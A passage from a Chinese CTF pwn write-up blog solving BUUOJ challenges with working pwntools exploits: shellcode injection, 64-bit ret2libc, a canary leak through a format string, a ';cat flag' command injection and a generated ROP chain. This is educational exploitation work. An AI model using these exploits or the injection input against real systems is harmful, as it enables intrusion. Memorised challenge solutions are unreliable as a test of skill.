class="comment">#后面的aaaa是测试数据，随便输入的，我们等等去栈上找它的地址</span></span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">p.sendline(payload)</span><br><span class="line">pause()</span><br></pre></td></tr></table></figure>

<p><code>0x8048600</code>是一个<code>nop</code>指令的地址，在这里下一个断点，方便调试</p>
<p><img src="/./images/image-20250131231137749.png" alt="image-20250131231137749"></p>
<p><em>这里输入地址的结尾是abc</em></p>
<p>按c执行下一步，然后输入<code>stack 50</code>看一下栈布局</p>
<p><img src="/./images/image-20250131233050407.png" alt="image-20250131233050407"></p>
<p><strong>解决一下shellcode在栈上的位置（填充多少数据合适）</strong></p>
<p>可以看到我们输入的crashme有一部分在距离<code>esp</code>0x24处，因为没有对齐的原因，cr在上面一行，对应0x63 0x72(小端序)</p>
<p>然后ebp在0x38处，我们输入的参数0x22处（虽然左边标的是0x20，但是有两个字节不是我们输入的，真正输入的是0x72 0x63)，所以ebp距离我们输入点的距离是<code>0x38-0x22=0x16</code>，而shellcode是写在ebp后面的，也就是<code>0x16+0x4</code>的地方</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;crashme\x00&#x27;</span>+<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x16</span>-<span class="number">8</span>+<span class="number">4</span>)+p32(addr)</span><br></pre></td></tr></table></figure>

<blockquote>
<p>crashme\x00占8个字节减去，ebp占4个字节要覆盖</p>
</blockquote>
<p><strong>解决shllcode的地址问题</strong></p>
<p>上面已经将我们的输入地址打印出来了（结尾是<code>abc</code>，在ebp下面）</p>
<p>既然我们只有一次输入机会，那么我们构造完返回地址之后直接跟着shellcode好了，所以直接把地址返回到ebp+8的位置就行</p>
<p><code>0xfff9eabc-0xfff9eaa0=0x1c</code>，所以最终地址偏移为0x1c</p>
<p>最后得到exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;i386&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">context.terminal = <span class="string">&#x27;wt.exe -d . wsl.exe -d Ubuntu&#x27;</span>.split()</span><br><span class="line"><span class="comment">#elf = ELF(&quot;./pwn&quot;)</span></span><br><span class="line"><span class="comment">#libc = ELF(&quot;./libc.so.6&quot;)</span></span><br><span class="line"><span class="comment">#p = process(&#x27;./pwn&#x27;)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">p=remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">26858</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;crash: &#x27;</span>)</span><br><span class="line">stack_addr=<span class="built_in">int</span>(p.recv(<span class="number">10</span>),<span class="number">16</span>)</span><br><span class="line">shellcode=asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;crashme\x00&#x27;</span>+<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x16</span>-<span class="number">8</span>+<span class="number">4</span>)+p32(stack_addr-<span class="number">0x1c</span>)+shellcode</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



<h2 id="34-jarvisoj-level3-x64"><a href="#34-jarvisoj-level3-x64" class="headerlink" title="34 jarvisoj_level3_x64"></a>34 jarvisoj_level3_x64</h2><p>64位的***<code>ret2libc</code>***从栈传参变成了寄存器传参</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">28910</span>)</span><br><span class="line"><span class="comment">#p=process(&#x27;./pwn&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">rdi_add = <span class="number">0x4006b3</span></span><br><span class="line">rsir15_add = <span class="number">0x4006b1</span></span><br><span class="line">write_plt = elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">vul_add = elf.symbols[<span class="string">&#x27;vulnerable_function&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x80</span> + <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x8</span></span><br><span class="line">payload1=payload+p64(rdi_add)+p64(<span class="number">0x1</span>)+p64(rsir15_add)+p64(write_got)+<span class="string">b&#x27;deadbeef&#x27;</span>+p64(write_plt)+p64(vul_add)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Input:\n&quot;</span>)</span><br><span class="line">p.sendline(payload1)</span><br><span class="line">write_addr = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;write&#x27;</span>,write_addr)</span><br><span class="line">libc_base=write_addr-libc.dump(<span class="string">&#x27;write&#x27;</span>)</span><br><span class="line">sys_add = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">binsh_add =libc_base+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">payload2 = payload + p64(rdi_add) + p64(binsh_add) + p64(sys_add)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="35-mrctf2020-shellcode"><a href="#35-mrctf2020-shellcode" class="headerlink" title="35 mrctf2020_shellcode"></a>35 mrctf2020_shellcode</h2><p><em><strong>ret2shellcode</strong></em></p>
<p>ida没法反编译了，这次读汇编（其实只要传入shellcode就行）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">context.terminal = <span class="string">&#x27;wt.exe -d . wsl.exe -d Ubuntu&#x27;</span>.split()</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&quot;./libc.so.6&quot;)</span></span><br><span class="line"><span class="comment">#p = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">26947</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">p.sendline(shellcode)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>接下来看一下汇编</p>
<p><img src="/./images/image-20250201215315053.png" alt="image-20250201215315053"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">buf= byte ptr -410h	;buf 表示相对于基指针 rbp 偏移量为 -410h 的一个字节内存位置</span><br><span class="line">var_4= dword ptr -4	;var_4 表示相对于基指针 rbp 偏移量为 -4 的一个双字（32 位，4 字节）内存位置</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">push    rbp</span><br><span class="line">mov     rbp, rsp</span><br><span class="line">sub     rsp, 410h</span><br></pre></td></tr></table></figure>

<p>这里是开辟0x410字节空间的栈</p>
<p>中间一部分应该是缓冲区设置，没看懂，但也不需要看懂，跳过</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">lea     rdi, s          ; &quot;Show me your magic!&quot;</span><br><span class="line">call    _puts</span><br></pre></td></tr></table></figure>

<ul>
<li><p><code>lea rdi, s</code>：将字符串 <code>&quot;Show me your magic!&quot;</code> 的地址加载到 <code>rdi</code> 寄存器中，作为 <code>_puts</code> 函数的参数。</p>
</li>
<li><p><code>call _puts</code>：调用 <code>_puts</code> 函数输出字符串，并自动添加换行符。</p>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">lea     rax, [rbp+buf]</span><br><span class="line">mov     edx, 400h       ; nbytes</span><br><span class="line">mov     rsi, rax        ; buf</span><br><span class="line">mov     edi, 0          ; fd</span><br><span class="line">mov     eax, 0</span><br><span class="line">call    _read</span><br></pre></td></tr></table></figure>

<ul>
<li><code>lea rax, [rbp+buf]</code>：计算相对于基指针 <code>rbp</code> 偏移量为 <code>-410h</code> 的内存地址，并将其加载到 <code>rax</code> 寄存器中，作为读取数据的缓冲区地址。</li>
<li><code>mov edx, 400h</code>：将读取的最大字节数 <code>400h</code> 加载到 <code>edx</code> 寄存器中。</li>
<li><code>mov rsi, rax</code>：将缓冲区地址传递给 <code>_read</code> 函数的第二个参数。</li>
<li><code>mov edi, 0</code>：将文件描述符 <code>0</code>（标准输入）传递给 <code>_read</code> 函数的第一个参数。</li>
<li><code>mov eax, 0</code>：将返回值寄存器 <code>eax</code> 清零。</li>
<li><code>call _read</code>：调用 <code>_read</code> 函数从标准输入读取最多 <code>400h</code> 字节的数据到缓冲区中。</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov     [rbp+var_4], eax</span><br><span class="line">cmp     [rbp+var_4], 0</span><br><span class="line">jg      short loc_11D6</span><br></pre></td></tr></table></figure>

<ul>
<li><code>mov [rbp+var_4], eax</code>：将 <code>_read</code> 函数的返回值（实际读取的字节数）保存到相对于基指针 <code>rbp</code> 偏移量为 <code>-4</code> 的内存位置（var_4)</li>
<li><code>cmp [rbp+var_4], 0</code>：比较实际读取的字节数是否为 <code>0</code>，用于后续的条件判断。</li>
<li><code>jg</code>基于前面 <code>cmp [rbp+var_4], 0</code> 指令设置的标志位进行判断。<code>[rbp+var_4]</code> 中存储的是 <code>_read</code> 函数实际读取的字节数，如果这个值大于 0，程序就会跳转到 <code>loc_11D6</code> 标签处继续执行；如果不满足条件（即读取的字节数小于等于 0），则继续顺序执行下一条指令。</li>
</ul>
<p><strong>若失败，即无读入（左边）</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov     eax, 0</span><br><span class="line">jmp     short locret_11E4</span><br></pre></td></tr></table></figure>

<ul>
<li><code>mov eax, 0</code>：将寄存器 <code>eax</code> 赋值为 0。在很多系统调用和函数返回中，<code>eax</code> 通常用于存储返回值，这里将其置为 0 表示程序以正常状态退出或者操作失败的返回码。</li>
<li><code>jmp short locret_11E4</code>：无条件跳转到 <code>locret_11E4</code> 标签处，跳过后续代码直接进入函数返回流程。</li>
</ul>
<p><strong>若成功，即有读入（右边）</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">loc_11D6:                               ; CODE XREF: main+78↑j</span><br><span class="line">lea     rax, [rbp+buf]</span><br><span class="line">call    rax</span><br><span class="line">mov     eax, 0</span><br></pre></td></tr></table></figure>

<ul>
<li><code>loc_11D6</code>：这是一个代码标签，当满足 <code>jg</code> 跳转条件时会跳转到这里。</li>
<li><code>lea rax, [rbp+buf]</code>：<code>lea</code> 是加载有效地址指令，这里将相对于基指针 <code>rbp</code> 偏移量为 <code>-410h</code>（前面定义的 <code>buf</code>）的内存地址加载到 <code>rax</code> 寄存器中。</li>
<li><code>call rax</code>：这是一个间接调用指令，它会将程序控制权转移到 <code>rax</code> 寄存器所指向的地址处执行代码。</li>
<li><code>mov eax, 0</code>：同样将寄存器 <code>eax</code> 赋值为 0，可能用于表示函数的正常返回状态。</li>
</ul>
<p><strong>综上，可以很清楚的发现，直接往buf里面写入代码之后函数就会直接执行buf里的代码，所以直接注入shellcode就行</strong></p>
<h2 id="36-bjdctf-2020-babyrop2"><a href="#36-bjdctf-2020-babyrop2" class="headerlink" title="36 bjdctf_2020_babyrop2"></a>36 bjdctf_2020_babyrop2</h2><p><em><strong>格式化字符串+canary绕过+ret2libc</strong></em></p>
<p>我记得写过canary绕过的wp，忘了在哪了，再写一份吧</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">context.terminal = <span class="string">&#x27;wt.exe -d . wsl.exe -d Ubuntu&#x27;</span>.split()</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&quot;./libc.so.6&quot;)</span></span><br><span class="line"><span class="comment">#p = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">26391</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line">put_plt=elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">put_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">pop_rdi=<span class="number">0x0400993</span></span><br><span class="line">main_addr=elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">vuln_addr=<span class="number">0x400887</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;help u!\n&#x27;</span>,<span class="string">b&#x27;%7$p&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">canary = <span class="built_in">int</span>(p.recv(<span class="number">16</span>),<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">payload = p64(canary)</span><br><span class="line">payload = payload.rjust(<span class="number">0x20</span>,<span class="string">b&#x27;a&#x27;</span>)+<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>+p64(pop_rdi)+p64(put_got)+p64(put_plt)+p64(vul</span><br><span class="line">n_addr)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;story!\n&#x27;</span>,payload)</span><br><span class="line">put_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,put_addr)</span><br><span class="line">libcbase=put_addr-libc.dump(<span class="string">&quot;puts&quot;</span>)</span><br><span class="line">system_addr=libcbase+libc.dump(<span class="string">&quot;system&quot;</span>)</span><br><span class="line">binsh_addr=libcbase+libc.dump(<span class="string">&quot;str_bin_sh&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = p64(canary)</span><br><span class="line">payload = payload.rjust(<span class="number">0x20</span>,<span class="string">b&#x27;a&#x27;</span>)+<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>+p64(pop_rdi)+p64(binsh_addr)+p64(system_addr)+</span><br><span class="line">p64(vuln_addr)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;story!\n&#x27;</span>,payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p><strong>审题</strong></p>
<ul>
<li><p><code>checksec</code>一下，发现开启了NX和canary</p>
</li>
<li><p>ida看一下，直接去<code>gift()</code>函数</p>
<ul>
<li><p><img src="/./images/image-20250201232816600.png" alt="image-20250201232816600"></p>
</li>
<li><p>v2就是canary值（一会后面解释canary保护），距离rbp为<code>0x-8</code></p>
</li>
<li><p>这里还读入了format函数，格式化字符串试试，看看我们的第几个输入可以被解析为格式化字符</p>
</li>
<li><p>我是输入<code>aa%n$p</code>,一个个试过去，看看哪个对应出61，最后发现输入<code>aa%6$p</code>的时候输出为<code>aa0x702436256161</code>，说明：<strong>第六个参数可以被解析成格式化字符串</strong></p>
</li>
<li><p>接下来动态调试一下看看canary的值是哪个（不出意外就是后一个）</p>
<ul>
<li>在printf处下断点，然后run运行到断点处，输入aa，然后查看栈结构</li>
<li><img src="/./images/image-20250201233714092.png" alt="image-20250201233714092"></li>
<li>canary值（v2)在rbp-8处，而我们输入的aa在它的上面，所以canary值可以用<code>%7$p</code>打印出来</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="canary保护"><a href="#canary保护" class="headerlink" title="canary保护"></a><strong>canary保护</strong></h3><p>简单来说，就是程序在开始运行前从一块只读数据中读出来一个随机数存在栈底（rbp上面一个），然后返回的时候看看栈底这个数变了没，变了就说明被栈溢出了，程序中断。</p>
<p>而想要绕过也很简单，只需要我们将canary的值读出来，在构造payload的时候放在它本来就该在的位置就好了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload = p64(canary)	<span class="comment"># 写入canary值</span></span><br><span class="line">payload = payload.rjust(<span class="number">0x20</span>,<span class="string">b&#x27;a&#x27;</span>)	<span class="comment"># buf距离rbp为0x20，所以直接将canary和垃圾数据一起填满这32字节</span></span><br></pre></td></tr></table></figure>

<p><em>后面3就是正常的ret2libc了，都写烂了要，不说了</em></p>
<h2 id="37-babyheap-0ctf-2017"><a href="#37-babyheap-0ctf-2017" class="headerlink" title="37 babyheap_0ctf_2017"></a>37 babyheap_0ctf_2017</h2><p>施工施工，heap先等等</p>
<h2 id="38-bjdctf-2020-router"><a href="#38-bjdctf-2020-router" class="headerlink" title="38 bjdctf_2020_router"></a>38 bjdctf_2020_router</h2><p>考察linux下的命令机制</p>
<h4 id="命令一；命令二这样的格式会执行两种指令"><a href="#命令一；命令二这样的格式会执行两种指令" class="headerlink" title="命令一；命令二这样的格式会执行两种指令"></a><code>命令一；命令二</code>这样的格式会执行两种指令</h4><p><img src="/./images/image-20250202230419710.png" alt="image-20250202230419710"></p>
<p>ida里面一看，<code>system(dest)</code>,前面还有一段将<code>buf</code>拼接到dest后面，那直接输入<code>;cat flag</code>秒了，exp都不用。直接nc</p>
<h2 id="39-inndy-rop"><a href="#39-inndy-rop" class="headerlink" title="39 inndy_rop"></a>39 inndy_rop</h2><p><strong>rop一把梭</strong>*</p>
<p>打开ida一看，这么多函数，这么明显的溢出，直接ropchain一把梭</p>
<p><code>ROPgadget --binary pwn --ropchain</code>直接可以生成rop链，把溢出填充好就直接用就行</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">context.terminal = <span class="string">&#x27;wt.exe -d . wsl.exe -d Ubuntu&#x27;</span>.split()</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&quot;./libc.so.6&quot;)</span></span><br><span class="line"><span class="comment">#r = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">r = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">29636</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(r)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># execve generated by ROPgadget</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"></span><br><span class="line"><span class="comment"># Padding goes here</span></span><br><span class="line">p = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0xC</span>+<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x4</span></span><br><span class="line"></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0806ecda</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea060</span>) <span class="comment"># @ .data</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080b8016</span>) <span class="comment"># pop eax ; ret</span></span><br><span class="line">p += <span class="string">b&#x27;/bin&#x27;</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0805466b</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0806ecda</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea064</span>) <span class="comment"># @ .data + 4</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080b8016</span>) <span class="comment"># pop eax ; ret</span></span><br><span class="line">p += <span class="string">b&#x27;//sh&#x27;</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0805466b</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0806ecda</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea068</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080492d3</span>) <span class="comment"># xor eax, eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0805466b</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080481c9</span>) <span class="comment"># pop ebx ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea060</span>) <span class="comment"># @ .data</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080de769</span>) <span class="comment"># pop ecx ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea068</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0806ecda</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea068</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080492d3</span>) <span class="comment"># xor eax, eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0806c943</span>) 